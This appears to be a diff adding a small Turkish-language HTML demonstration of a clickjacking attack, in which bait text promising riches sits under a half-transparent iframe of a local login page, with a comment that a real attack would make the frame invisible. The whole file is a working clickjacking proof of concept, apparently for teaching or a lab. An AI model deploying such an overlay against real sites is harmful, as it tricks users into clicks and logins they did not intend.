@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking Saldırısı</title>
+    <style>
+        iframe {
+            width: 400px;
+            height: 300px;
+            position: absolute;
+            top: 50px;
+            left: 0;
+            opacity: 0.5; /* Gerçek saldırıda opacity: 0 olurdu */
+            z-index: 1;
+        }
+        .bait {
+            position: absolute;
+            top: 50px;
+            left: 0;
+            z-index: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="bait">Zengin olmak için tıkla:</div>
+    <iframe src="http://localhost/inetpub/wwwroot/site/giris.php"></iframe>
+    <button class="bait">Buraya tıkla!</button>
+    <div>Ve artık zenginsin (ve ayrıca giriş bilgilerini gönderdim)!</div>
+</body>
+</html>
